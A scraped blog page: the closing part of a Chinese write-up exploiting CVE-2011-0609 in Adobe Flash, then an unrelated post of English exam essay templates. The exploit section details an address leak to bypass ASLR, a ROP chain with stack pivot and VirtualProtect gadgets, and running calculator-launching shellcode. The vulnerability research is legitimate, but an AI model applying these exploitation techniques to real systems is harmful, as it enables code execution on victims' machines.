<p>上图表示，正是我们在ByteArray写入的数据，即06bbd000为ByteArray地址。</p>
<p>所以，我们看我们所读的地址-14h处即为ByteArray地址，对照着我们构造函数的数据，4141414c处所在的地址-14h处对应的数据为41414147，因此，将我们构造函数数据为41414147赋设为length即可。<br>将构造函数代码改为如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-013.png" alt=""></p>
<p>通过修改，成功混淆出ByteArray地址。</p>
<p>按照偏移得出自定义函数在release版本中数据结构。</p>
<pre><code><span class="number">06</span>de6ffd b006def0 d006de70 <span class="number">0006</span>de71 <span class="number">00000000</span>
<span class="number">06</span>de700d <span class="number">02000000</span> <span class="number">00009000</span> <span class="number">00000000</span> <span class="number">30000000</span>
<span class="number">06</span>de701d <span class="number">4606</span>abdb <span class="number">41004f</span>00 <span class="number">42414141</span> <span class="number">43414141</span>
<span class="number">06</span>de702d <span class="number">44414141</span> <span class="number">45414141</span> <span class="number">46414141</span> <span class="number">47414141</span>
<span class="number">06</span>de703d <span class="number">48414141</span> <span class="number">49414141</span> <span class="number">4</span>a414141 <span class="number">4</span>b414141
<span class="number">06</span>de704d <span class="number">4</span>c414141 <span class="number">4</span>d414141 <span class="number">4e414141</span> <span class="number">4f</span>414141
<span class="number">06</span>de705d <span class="number">41414141</span> <span class="number">42414142</span> <span class="number">43414142</span> <span class="number">44414142</span>
<span class="number">06</span>de706d <span class="number">45414142</span> <span class="number">46414142</span> <span class="number">47414142</span> <span class="number">48414142</span>
<span class="number">06</span>de707d <span class="number">49414142</span> <span class="number">4</span>a414142 <span class="number">4</span>b414142 <span class="number">4</span>c414142
<span class="number">06</span>de708d <span class="number">4</span>d414142 <span class="number">4e414142</span> <span class="number">4f</span>414142 <span class="number">44414142</span>
<span class="number">06</span>de709d <span class="number">48414243</span> <span class="number">70454647</span> <span class="number">6e006100</span> <span class="number">4e007900</span>
<span class="number">06</span>de70ad <span class="number">00006100</span> <span class="number">73000000</span> <span class="number">2f</span>737265 <span class="number">4</span>c4c4544
</code></pre><p>在release版本中，如上图我们可控制的数据，我们能够读取的地址只能是从偏移28h处开始。</p>
<p>对照ByteArray结构<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-014.png" alt=""></p>
<p>同时也证实了前边我们读取的41414143位置也并不是ByteArray数据结构中偏移18h处的地址，而是偏移2ch处的地址，而这个偏移处也刚好是一个flash模块地址！</p>
<h3 id="总结">总结</h3><p>需要注意的是，在构造函数中定义的参数值一定不能重复，不然release版本会进行优化，数据个数会减少。</p>
<p>经过多次尝试，在realease版本中我们构造的函数数据在内存中存放的地址是连续的，但是数据存放顺序会被打乱，ByteArray在realease版本中数据结构并没有改变，因此，我们依然可以用这种方法读取任意想得到的地址。</p>
<h2 id="完整的漏洞利用">完整的漏洞利用</h2><p>要成功利用这个漏洞，要清楚以下三个问题<br>1.如何控制程序流程<br>2.如何过ASRL和DEP<br>3.如何执行shellcode</p>
<h3 id="控制流程">控制流程</h3><p>控制程序流程比较容易想到，通过出发漏洞的源码和异常出错的汇编代码，可以看出，只要在String适当的偏移处将AAAA改为我们想控制的地址，就可以控制程序的流程了。<br>触发漏洞代码<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-015.png" alt=""></p>
<p>异常汇编代码<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-016.png" alt=""></p>
<p>如上图所示，[eax+8]存放着String字符串的内容地址，即[ecx+0A0h]=String[0A0h](写法仅方便阅读)，也就是说我们在String[0A0h]处存放着我们想要控制的地址指针，然后在下边的call eax之后就进入我们的控制之中了。</p>
<h3 id="突破DEP+ASLR">突破DEP+ASLR</h3><p>通过上次混淆出来的flash模块地址，可以轻松绕过ASRL；<br>突破DEP的法是通过构造一个ROP链来实现，这个也是该漏洞利用的一个难点，代码的编写花费的时间最多，需要一些技巧和运气。</p>
<h3 id="执行shellcode">执行shellcode</h3><p>如何执行shellcode，首先我们将shellcode写入内存是不可执行的，因此我们要调用virtualprotect函数将地址改为可执行属性，virtualprotect函数可以通过flash模块地址和偏移地址定位。</p>
<h2 id="完整的利用过程">完整的利用过程</h2><p>1.首先我们先定义一个ByteArray，然后将shellcode写进去，然后通过混淆得到ByteArray的地址，也就是shellcode的地址ScAddr。</p>
<p>2.然后我们构造Rop链，Rop链需要完成的功能有三个，先是控制esp，然后是通过调用virtualprotect函数将shellcode代码段内存改为可执行属性，最后要实现的功能是跳入shellcode。通过混淆得到Rop链地址RopAddr。</p>
<p>3.最后，我们将Rop链的地址ScAddr写在String[0A0h]处，通过混淆出发漏洞，然后得到控制权，去实现Rop链中的功能，最后成功执行shellcode。</p>
<p>4.在整个过程中，在往ByteArray中写数据时候要注意大小字节序，Flash默认是大字节序列。</p>
<h3 id="控制esp">控制esp</h3><p>在Rop链的一开始，肯定是要先得到esp的控制权，需要我们在flash模块里边找到一条xchg eax，esp；ret代码。代码很容易找到，但是发现即使执行了依然控制不了esp，原因是我们在控制流程的语句call eax时候，eax的值已经不是Rop链的地址了，而是Rop链中我们得到esp控制权的代码的地址，形似[RopAddr]，也就是说，我们执行完xchg eax，esp；ret代码之后，就失去了程序的控制权，这个问题也困扰了好久。</p>
<p>我们再回过头来看控制代码</p>
<pre><code>0688afb8 8b4808          <span class="keyword">mov</span>     <span class="literal">ecx</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">8</span>]
0688afbb 8b89a0000000    <span class="keyword">mov</span>     <span class="literal">ecx</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ecx</span>+<span class="number">0A0h</span>]
0688afc1 8d55b8          <span class="keyword">lea</span>     <span class="literal">edx</span>,[<span class="literal">ebp</span>-<span class="number">48h</span>]
0688afc4 8945b8          <span class="keyword">mov</span>     <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ebp</span>-<span class="number">48h</span>],<span class="literal">eax</span>
0688afc7 8b01            <span class="keyword">mov</span>     <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ecx</span>]  <span class="literal">ds</span>:<span class="number">0023</span>:<span class="number">41414141</span>=????????
0688afc9 <span class="number">52</span>              <span class="keyword">push</span>    <span class="literal">edx</span>
0688afca 6a00            <span class="keyword">push</span>    <span class="number">0</span>
0688afcc <span class="number">51</span>              <span class="keyword">push</span>    <span class="literal">ecx</span>
0688afcd ffd0            <span class="keyword">call</span>    <span class="literal">eax</span>  //获得控制权
</code></pre><p>我们发现，程序获得控制权是先将RopAddr的传送给ecx，然后将[ecx]赋值给eax，然后才是我们控制esp的代码call eax，因此，ecx始终等于RopAddr，既然eax不能用，完全可以用xchg ecx，esp；ret</p>
<p>接着分析，只执行xchg ecx，esp；ret还是不够的，我们要执行下一条代码，需要在xchg ecx，esp之后将esp+4，然后是ret才能成功跳进吓一跳代码中。在flash模块中并没有找到理想的代码形如</p>
<pre><code><span class="keyword">xchg</span> <span class="literal">ecx</span>，<span class="literal">esp</span>
<span class="keyword">add</span> <span class="literal">esp</span>，xx
<span class="keyword">ret</span>
</code></pre><p>既然xchg指令不能用，换个方式，形如</p>
<pre><code><span class="keyword">mov</span> <span class="literal">esp</span>，<span class="literal">ecx</span>
<span class="keyword">add</span> <span class="literal">esp</span>，xx
<span class="keyword">ret</span>
</code></pre><p>或者</p>
<pre><code><span class="keyword">push</span> <span class="literal">ecx</span>
<span class="keyword">pop</span> <span class="literal">esp</span>
<span class="keyword">add</span> <span class="literal">esp</span>，xx
<span class="keyword">ret</span>
</code></pre><p>最后，在flash模块中找到如下可用代码：</p>
<pre><code>057d5fe1 <span class="number">51</span>              <span class="keyword">push</span>    <span class="literal">ecx</span>
057d5fe2 5c              <span class="keyword">pop</span>     <span class="literal">esp</span>
057d5fe3 8b889c000000    <span class="keyword">mov</span>     <span class="literal">ecx</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">9Ch</span>]
057d5fe9 <span class="number">52</span>              <span class="keyword">push</span>    <span class="literal">edx</span>
057d5fea <span class="number">51</span>              <span class="keyword">push</span>    <span class="literal">ecx</span>
057d5feb e860c2fcff      <span class="keyword">call</span>    Flash10i+<span class="number">0xb2250</span> (057a2250) //不影响<span class="literal">esp</span>
057d5ff0 83c410          <span class="keyword">add</span>     <span class="literal">esp</span>,<span class="number">10h</span>
057d5ff3 c3              <span class="keyword">ret</span>
</code></pre><p>通过flash模块地址和偏移，算得代码地址，记作 add_xchg_ecx_esp</p>
<h3 id="修改内存属性">修改内存属性</h3><p>在控制esp之后，就开始实现virtualprotect函数的功能，将我们的shellcode所在的内存属性变为可执行。通过ida加载flash10i.oxc得到virtualprotect函数偏移，再根据flash模块地址算出virtualprotect函数地址Add_virtualprotect。Vritualprotect函数代码如下：</p>
<pre><code>683ecee2 <span class="number">51</span>              <span class="keyword">push</span>    <span class="literal">ecx</span>
683ecee3 <span class="number">55</span>              <span class="keyword">push</span>    <span class="literal">ebp</span>
683ecee4 <span class="number">56</span>              <span class="keyword">push</span>    <span class="literal">esi</span>
683ecee5 <span class="number">57</span>              <span class="keyword">push</span>    <span class="literal">edi</span>
683ecee6 ff157c534b68    <span class="keyword">call</span>    <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [Flash10i!DllUnregisterServer+<span class="number">0x3059a9</span> (684b537c)] //<span class="keyword">call</span> virtualprotect
683eceec 03fe            <span class="keyword">add</span>     <span class="literal">edi</span>,<span class="literal">esi</span>
683eceee 2bde            <span class="keyword">sub</span>     <span class="literal">ebx</span>,<span class="literal">esi</span>
683ecef0 <span class="number">7404</span>            <span class="keyword">je</span>      Flash10i!DllUnregisterServer+<span class="number">0x23d523</span> (683ecef6)
683ecef2 85c0            <span class="keyword">test</span>    <span class="literal">eax</span>,<span class="literal">eax</span>
683ecef4 75d0            <span class="keyword">jne</span>     Flash10i!DllUnregisterServer+<span class="number">0x23d4f3</span> (683ecec6)
683ecef6 5f              <span class="keyword">pop</span>     <span class="literal">edi</span>
683ecef7 5e              <span class="keyword">pop</span>     <span class="literal">esi</span>
683ecef8 <span class="number">5d</span>              <span class="keyword">pop</span>     <span class="literal">ebp</span>
683ecef9 5b              <span class="keyword">pop</span>     <span class="literal">ebx</span>
683ecefa 83c420          <span class="keyword">add</span>     <span class="literal">esp</span>,<span class="number">20h</span>
683ecefd c3              <span class="keyword">ret</span>
</code></pre><p>通过代码可以看出，在调用函数成功后，eax肯定为非0，那么程序在执行test eax,eax之后肯定就跳走失去了控制权。</p>
<p>解决方法：我们直接跳入virtualprotect函数去实现我们的功能，然后构造我们的返回地址和参数，而不是通过call来调用，因此，我们在这一步先将virtualprotect函数地址放入[esp+4]，在esp处我们存放形如下代码的地址，</p>
<pre><code><span class="keyword">mov</span> <span class="literal">eax</span>，[<span class="literal">esp</span>+<span class="number">4</span>]
<span class="keyword">add</span> <span class="literal">esp</span>，xx   //跳过virtualprotect函数地址
<span class="keyword">ret</span>
</code></pre><p>然后ret之后esp存放着jmp [eax]地址（[eax]形似[684b537c]，684b537c为上边Vritualprotect函数代码部分），然后就可以顺利的执行了，最后分别在flash模块中找到可用代码。</p>
<p>地址Add_mov_eax_esp</p>
<pre><code><span class="number">05771008</span> 8b0424          <span class="keyword">mov</span>     <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">esp</span>]
0577100b <span class="number">59</span>              <span class="keyword">pop</span>     <span class="literal">ecx</span>
0577100c c3              <span class="keyword">ret</span>
</code></pre><p>地址Add_jmp_eax</p>
<pre><code>56f768f ff20            <span class="keyword">jmp</span>     <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>]
</code></pre><p>当然，解决这个问题方法不止一种，可以在这之前重新设置标志位，这样test eax，eax之前让它跳走就可以了。</p>
<p>综上，构造的Rop链结构如下所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-017.png" alt=""></p>
<h3 id="执行shellcode-1">执行shellcode</h3><p>通过上边的分析，利用构造的Rop链就可以顺利执行shellcode了，如弹出计算器。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-018.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2012/11/20/exploit-cve-2011-0609/" data-id="civbwooah004e5p6ivny3vz1u" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2012/11/20/exploit-cve-2011-0609/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/">cve</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-study-english-kaoyan-composition" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2012/10/27/study-english-kaoyan-composition/" class="article-date">
  <time datetime="2012-10-26T17:47:11.000Z" itemprop="datePublished">2012-10-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/study/">study</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2012/10/27/study-english-kaoyan-composition/">考研英语作文模版</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>考研英语作文模板，我去年用的，结合网上搜集的资料加上自己的想法总结的，有些陈述性句子我感觉还是不错的，基本万能吧。想下载打印的同学可以直接<a href="http://pan.baidu.com/s/1o7khRtw" target="_blank" rel="external">百度云盘</a>下载，解压密码<code>idhyt</code></p>
<h2 id="写在前边">写在前边</h2><p>1.补充一点，经验而谈，考英语时候一般发试卷前会把草稿纸先发给你，这时候你可以在草稿纸上把你背好的模版默写到草稿纸上，因为这时候算是大脑最平静的时候，当然你进考场之间还可以把作文模版再背一遍。以免到时候看到不是自己熟悉的作文心里一着急背的有用的陈述性的句子都忘记了。退一万步讲，即使作文不会写，起码蒙也能把背好的陈述性的句子给抄上去充字数。一般你往草稿纸上默写是不会管你的，我考的那会卷纸发下来之前我就把一张草稿纸默写满了，当时写作文的时候一点都不心急，就一个字，爽！</p>
<p>2.看到有人问到用这个模板得多少分的，去年我得的分是不低 根据网上估的选择题 算下来20分的大作文有13+ 可能这里有出入 不过去年的作文比较大众化 没有模板也可以编出来。</p>
<p>3.还有关于说用模板低分的问题，大家可以把开头几句陈述性的句子打乱下顺序，比如图表作文，开头的陈述性句子都是：</p>
<pre><code><span class="number">1</span><span class="class">.There</span> has been <span class="tag">a</span> discussion recently about apicture <span class="keyword">in</span> which _____。<span class="number">2</span>._____。<span class="number">3</span>. _____。<span class="number">4</span><span class="class">.The</span> pictures convey <span class="tag">a</span> <span class="attribute">clear</span> and <span class="tag">strong</span> message to us that_____。
</code></pre><p>我们可以倒一下过来：</p>
<pre><code><span class="number">4</span><span class="class">.The</span> pictures convey <span class="tag">a</span> <span class="attribute">clear</span> and <span class="tag">strong</span> message to us that_____。<span class="number">1</span><span class="class">.There</span> has been <span class="tag">a</span> discussion recently about apicture <span class="keyword">in</span> which _____。<span class="number">2</span>._____。<span class="number">3</span>._____。
</code></pre><p>或者你自己写个开头 加个倒装什么的 绝对亮瞎改卷老师的24K真金狗眼~~~</p>
<h2 id="应试作文杀招">应试作文杀招</h2><p>根据曹其军老师讲稿整理 </p>
<h3 id="总原则之一：">总原则之一：</h3><p>应试作文以又臭又长为好：臭——全是废话（改卷老师不会看你的内容的）；长——是很多废话的堆积；所以，考研作文要写到280——300字为好。 </p>
<h3 id="总原则之二：">总原则之二：</h3><p>要有固定，漂亮的“外表”</p>
<h3 id="历年试题">历年试题</h3><p>考研出题类型不外乎四种：（问题）单向类、（好现象）单向类、双向类、图表加前三种。 </p>
<h3 id="1-(问题)单向">1.(问题)单向</h3><p>格式总共是三段 </p>
<h4 id="段一_S1+S2+S3+S4+S5">段一 S1+S2+S3+S4+S5</h4><p>S(sentence)共5句话，一共60字左右，下面给出每句话可以套用的格式，这些漂亮的格式是一定要牢记和熟背的！ </p>
<p>S1是介绍，固定格式有 </p>
<pre><code><span class="number">1</span><span class="class">.The</span> past few <span class="function"><span class="title">years</span><span class="params">(decades)</span><span class="title">havewitnessed</span></span> us (our society) faced with the issue of…… 
<span class="number">2</span><span class="class">.In</span> recent years there has been <span class="tag">a</span> growing concern among the general publicover the issue of…… 
<span class="number">3</span><span class="class">.Nothing</span> can be more serious (upsetting ,outstanding, meaningful…) than theissue of…… 
</code></pre><p>S2+S3运用Flex 技巧进行扩展和包装，这些Flex 技巧在后面详细给出，要熟背！ </p>
<p>运用statistics: </p>
<pre><code>According <span class="built_in">to</span> <span class="operator">a</span> recent survey made <span class="keyword">by</span> Dr. Cao, head <span class="operator">of</span> sociology department <span class="keyword">at</span> Beijing University,<span class="number">70</span>%....;<span class="operator">and</span> <span class="number">30</span>%....(在此直接用数字，不要写英文，一般写两句随便给出两个数据足够) 
</code></pre><p>S4 同一份调查还表明…（又给出另一个数据） </p>
<pre><code>The same survey also shows <span class="keyword">that</span> +（又一数据） 
</code></pre><p>S5 收尾，与S1呼应，“由此可见,…问题已经非常严重了” </p>
<pre><code><span class="keyword">It </span>can <span class="keyword">be </span>concluded, therefore, that the issue of……has <span class="keyword">become </span>more <span class="keyword">and </span>moreserious (harmful). 
</code></pre><h4 id="段二_120——140字左右">段二 120——140字左右</h4><p>开头：S1 : 10 words </p>
<pre><code><span class="number">1</span><span class="class">.To</span> account <span class="keyword">for</span> the above-mentioned phenomenon (issue,tendency), various reasons (causes) have been put forward. 
<span class="number">2</span><span class="class">.The</span> above problem (phenomenon) may well give rise to some <span class="function"><span class="title">effects</span><span class="params">(consequences)</span></span> as follow. 
</code></pre><p>S2+S3+S4: 50 words<br>开始列举了，但是千万不要用那些滥词：first，second，firstly，secondly，印象分会降低，要用些漂亮的词，尽可能用短语： </p>
<pre><code>In <span class="operator">the</span> very beginning, 
+S2 
In <span class="operator">the</span> <span class="keyword">first</span> place, 
In <span class="operator">the</span> <span class="keyword">second</span> place, In <span class="operator">the</span> <span class="keyword">end</span>, 
+S3 +S4 
What is more, Last but 
</code></pre><p>S2,S3,S4 在简单阐述了各自一个观点之后，就开始进行Flex扩展，扩展可运用Quotation 或是Example达到增加60——80字：</p>
<p>Quotation: </p>
<pre><code>To illustrate the point, let’s take <span class="tag">a</span> look at what ……(President Cliton) said inan <span class="tag">article</span> :“。。。。” 
</code></pre><p>所以，整个第二段是核心段，基本结构是： </p>
<pre><code>开头S1（<span class="number">10</span>字） + S2 扩展
S3 <span class="number">50</span>字 扩展 共扩展<span class="number">60</span>-<span class="number">80</span>字 
S4 扩展 
</code></pre><h4 id="段三（解决方法，suggestions）_100_words">段三（解决方法，suggestions） 100 words</h4><p>S1 15 words </p>
<pre><code>1.We should <span class="keyword">take</span> immediate measures, <span class="keyword">for</span> if the present situation continues asbefore, serious outcome will come up. 
2.It <span class="keyword">is</span> high time <span class="keyword">that</span> (immediate measures <span class="keyword">be</span> taken <span class="keyword">now</span>.) (<span class="keyword">such</span> a problem <span class="keyword">be</span> put an <span class="keyword">end</span> to.) (a reform <span class="keyword">be</span> made.) 
</code></pre><p>S2+S3+S4+S5+S6 100 words or so </p>
<pre><code>S2. On <span class="constant">one</span> hand, we should urge our government <span class="built_in">to</span> lay down stricter rules <span class="built_in">to</span> forbid…… 
S3. Should anyone dare <span class="built_in">to</span> break <span class="operator">the</span> law, he <span class="built_in">to</span> she should be <span class="built_in">put</span> <span class="keyword">into</span> jail <span class="keyword">for</span> <span class="number">5</span> years. 
S4. In addition , our government should <span class="built_in">put</span> <span class="operator">in</span> more money <span class="built_in">to</span> protect (encourage) ……. 
S5. On <span class="operator">the</span> other hand, we should <span class="keyword">try</span> every means <span class="built_in">to</span> enhance <span class="operator">the</span> public awareness <span class="operator">of</span> <span class="operator">the</span> issue <span class="operator">of</span>….. 
S6. Only through these measures, I firmly believe, will <span class="operator">the</span> above-discussed problem be efficiently resolved.
</code></pre><h3 id="2-(好现象)单向类">2.(好现象)单向类</h3><p>段一 介绍60 字 </p>
<p>段二 分析 重要性原因（或结果 benefits） 做法 </p>
<p>段三 结论（要重视） </p>
<h4 id="段一_介绍">段一 介绍</h4><p>开头：</p>
<pre><code>Nothing can be more <span class="function"><span class="title">outstanding</span><span class="params">(meaningful)</span></span> than …… 
</code></pre><p>接下来运用的扩展和（问题）单向类相同 </p>
<h4 id="段二_分析">段二 分析</h4><p>(1)开头：</p>
<pre><code>The <span class="keyword">above</span> phenomenon may wellgive rise <span class="keyword">to</span> <span class="keyword">some</span> benefits <span class="keyword">as</span> follow. 
</code></pre><p>(2)benefits 社会的<br>经济的<br>个人的 </p>
<p>(3)做法</p>
<pre><code>As <span class="operator">the</span> phenomenon is important ,we can approach <span class="keyword">it</span> <span class="operator">in</span> <span class="operator">the</span> following ways. 
</code></pre><p>接下来运用扩展技巧 </p>
<h4 id="段三_结论">段三 结论</h4><p>重视 社会生活 （money，awareness）<br>个人生活 （awareness，我的决心等等） </p>
<p>说明：该现象为较大类的，如 希望工程，就可以加上社会的重视；较小的如 交朋友，信念如明灯，就只用个人生活的做法。<br>开头：</p>
<pre><code>It goes <span class="keyword">without</span> saying <span class="keyword">that</span> due attention should be paid <span class="keyword">to</span> <span class="keyword">the</span> phenomenon. 
</code></pre><h3 id="3-双向类">3.双向类</h3><p>(1) A1 VS A2 = contrast “对照”即是一个事物的两方面做比较，如看电视的利弊，出国留学等等，A1好，A2坏；或是A1坏，A2好； </p>
<p>(2)A VS B = compare 对比 即是两个事物做比较，如锻炼是跑步好还是做操好等，A B同好或是同不好 </p>
<p>但是两种题型结构都是一样的，如下： </p>
<pre><code>段一 摆擂台，展现“两”面 
段二 回到A（<span class="literal">A1</span>） 
单向分析 原因，或结果，重要性，做法 
段三 回到<span class="keyword">B（A2） </span>
段四 结尾 选择类 A or <span class="keyword">B </span>
表态类（用死不表态法） <span class="literal">A1</span> vs <span class="literal">A2</span> 
</code></pre><h4 id="段一">段一</h4><pre><code><span class="number">1.</span>When <span class="keyword">it</span> comes <span class="keyword">to</span> <span class="keyword">the</span> issue(phenomenon) <span class="keyword">of</span> ……(tuition fee;TV effects), different people have radically different opinions. Some people hold <span class="keyword">onto</span> <span class="keyword">the</span> idea <span class="keyword">that</span> ……. Other people ,however, deem <span class="keyword">that</span>……. 
<span class="number">2.</span> As regards <span class="keyword">the</span> issue <span class="keyword">of</span>……,there <span class="keyword">is</span> a popular discussion. Some people … Otherpeople ,however,…… 
</code></pre><h4 id="段二">段二</h4><p>开头：</p>
<pre><code>…… because <span class="operator">of</span> <span class="operator">the</span> followingfactors. 
</code></pre><p>接下来和单向类的段二相同 </p>
<h4 id="段三">段三</h4><p>开头 </p>
<pre><code><span class="keyword">By</span> comparison, 
A <span class="keyword">or</span> B 
<span class="keyword">In</span> the similar way, 
<span class="keyword">By</span> contrast, 
A1 VS A2 
Quite <span class="keyword">on</span> the contrary, 
</code></pre><p>接下来和单向类段二相同 </p>
<h4 id="段四">段四</h4><p>表态类（死不表态法） </p>
<pre><code>Just <span class="keyword">as</span> <span class="keyword">any</span> coin has <span class="constant">two</span> sides, <span class="keyword">it</span>’s no exception <span class="operator">with</span> <span class="operator">the</span> issue <span class="operator">of</span> …. Actuallythe issue is just like <span class="operator">a</span> double-edged sword,<span class="operator">and</span> we should <span class="keyword">try</span> every means toavoid its harmfulness <span class="keyword">while</span> <span class="keyword">at</span> <span class="operator">the</span> same <span class="built_in">time</span>, making <span class="operator">the</span> most <span class="operator">of</span> its advantages. 
</code></pre><p>选择类 </p>
<pre><code><span class="keyword">As</span> discussed above, <span class="keyword">each</span> side <span class="keyword">has</span> its advantages <span class="keyword">and</span> disadvantages. <span class="keyword">If</span> I’mallowed <span class="keyword">to</span> make a decision, I prefer A <span class="keyword">to</span> B ( B <span class="keyword">to</span> A) , <span class="keyword">for</span> the following reasons. <span class="keyword">On</span> one hand,….. <span class="keyword">On</span> the other hand,…… 
</code></pre><h3 id="4-图表类">4.图表类</h3><p>此类作文是近年来的热点，但这类作文只有段一和前三类不同,其他都一样的来写.<br>每一幅图画(表),尤其是cartoon, 是要表达一个philosophy(哲理),因此,段一就是描述这一哲理的段落,但是描述的时候只用一到两句话来“轻描淡写”说出这个哲理即可。<br>近年来几乎考的都是cartoon，但是一定不要陷如误区以为要对cartoon进行大量的描写，象今年考的养老的cartoon，其实就两句话描述一下画面就马上引出你的结论，接着就开始拿问题类作文的格式一套，so easy！ </p>
<h4 id="段一-1">段一</h4><p>一、“从这幅漫画中我们可以得出这样一个结论：……” </p>
<pre><code><span class="number">1.</span>As can be seen <span class="built_in">from</span> <span class="operator">the</span> cartoon,we are able <span class="built_in">to</span> arrive <span class="keyword">at</span> <span class="operator">a</span> conclusion that ……
<span class="number">2.</span>As shown <span class="built_in">from</span> <span class="operator">the</span> above picture, <span class="constant">one</span> point is obvious.
</code></pre><p>（1）两张图<br>    1.Upon carefully observation, we will find that the two pictures above are closely related in meaning. 2.In the upper one,<strong>_</strong>。3.In the lowerone, however,<strong>_</strong>。4.The pictures convey a clear and strong message to us that<strong>_</strong>。</p>
<p>（2）一张图<br>    1.There has been a discussion recently about apicture in which <strong>_</strong>。2.<strong>_</strong>。3.<strong>_</strong>。4.The picturesconvey a clear and strong message to us that<strong>_</strong>。</p>
<p>用以上两个模板对付所有的Describe要求的首段应该不成问题了。有模板撑着，只要在划横线的地方随便对图片做一些描写就OK了。</p>
<p>二、如果是graph作文，则一定会有数据，就一定会表现出一定的趋势（tendency，trend） </p>
<pre><code>There has been <span class="tag">a</span> <span class="function"><span class="title">gradual</span><span class="params">(slow,sharp)</span></span> <span class="function"><span class="title">increase</span><span class="params">(decrease)</span></span> <span class="keyword">in</span> the number (amount,size ) of ……over the past few years (decades). 
There has been ……increase……of ……<span class="class">.while</span> there has been ……decrease ……of ….. 
</code></pre><p>将趋势描述出来后，再在graph上找出两个同类数据来支持我们的结论就ok了。不要将graph上的所有数据都列举出来。 </p>
<p>段二，段三，段四就和单向或双向作文一模一样了。</p>
<h4 id="段二-1">段二</h4><p>第二段的提问方式目前有两种：Interrept（点明旨意）和example（举例）。我们分别“对症下药”<br>(1) Interrept（点明旨意）型的：</p>
<pre><code><span class="number">1</span><span class="class">.The</span> picture is based on the realities ofsociety. <span class="number">2</span><span class="class">.Just</span> like theperson <span class="keyword">in</span> the picture, some people_____. <span class="number">3</span>._____。<span class="number">4</span>._____。<span class="number">5</span><span class="class">.Such</span> cases can be found <span class="keyword">in</span> almost all walks of life.
</code></pre><p>(2) example（举例）：</p>
<pre><code><span class="number">1.</span>Since many <span class="keyword">of</span> the philosophic principle weadhere <span class="keyword">to</span> are adstracted <span class="keyword">from</span> the daily life, <span class="literal">it</span> <span class="keyword">is</span> easy <span class="keyword">to</span> find <span class="literal">that</span> examplesin the world around us. <span class="number">2.</span>The ideaillustrated <span class="keyword">in</span> <span class="keyword">this</span> picture <span class="keyword">is</span> <span class="literal">no</span> exception. <span class="number">3.</span>Forexample_____。<span class="number">4._____</span>。<span class="number">5._____</span>。<span class="number">6.</span>In fact,everyone has surely seen similar evidence <span class="keyword">of</span> <span class="keyword">this</span> truth <span class="keyword">in</span> the their own life.
</code></pre><p>一般有模板撑着，在空缺的地方补上一两句简单的话就可以了。</p>
<h4 id="段三-1">段三</h4><p>关键是第三段，大多数情况是Comment（评论），一般都是就事论事，很难找到通打一切的模板。<br>但经过分析，但凡评论或建议，抽象后就只够两个方面了：好的和不好的。<br>所以只要准备两个高度抽象的评论段落，就OK了。<br>请看：<br>(1) 对于不好现象的评论：</p>
<pre><code>Considering the current issue and worsening situation, we should <span class="operator"><span class="keyword">call</span> <span class="keyword">for</span> <span class="keyword">some</span> <span class="keyword">immediate</span> <span class="keyword">action</span> imposed <span class="keyword">by</span> the authorities. <span class="keyword">In</span> other words, our government ofvarious <span class="keyword">levels</span> must make relevant plans <span class="keyword">or</span> <span class="keyword">rules</span> <span class="keyword">to</span> <span class="keyword">guarantee</span> a proper orderand justice. Beside, the <span class="keyword">general</span> <span class="keyword">public</span> should also be made aware that anyprompt solution <span class="keyword">is</span> <span class="keyword">of</span> benefit <span class="keyword">to</span> all. Therefore, it’s the duty <span class="keyword">of</span> ordinary people <span class="keyword">to</span> actively participate <span class="keyword">in</span> the <span class="keyword">action</span>.</span>
</code></pre><p>(2) 对于好现象的评论：</p>
<pre><code>So far <span class="keyword">it</span>’s <span class="operator">not</span> difficult <span class="built_in">to</span> see that <span class="operator">a</span> positive attitude should be maintained here. For <span class="constant">one</span> thing, <span class="keyword">each</span> <span class="constant">one</span> <span class="operator">of</span> us must be aware <span class="operator">of</span> its significance andpossible beneficial effects. This way we can translate <span class="keyword">into</span> proper action indaily life. For <span class="operator">the</span> other, some positive action should also be encouraged inthe <span class="keyword">whole</span> society.
</code></pre><p>把上面两段狂背下来。</p>
<p>这里要说的是，在第三段的提问中，Suggest（给建议）就等于Comment（评论），Implication(联系实际)，就套第二段的example（举例）即可。</p>
<h3 id="三大扩展技巧——Flex">三大扩展技巧——Flex</h3><p>扩展技巧是帮助自己在没话可说的时候达到快速增加作文字数的最有效的方法，运用flex的目的就是想让文章长就长，爱短就短。因此可以熟练运用flex来控制字数。 </p>
<h4 id="一、Quotation_引用">一、Quotation 引用</h4><p>就是随便找一个人出来，介绍他一番，引用他的话，然后说我就是这样想的。（大约增加50字）而且引用此人的话一定要用：“。。。。”这样的直接引语格式，直接用现在时的<br>时态，避免自己在时态上出错。 </p>
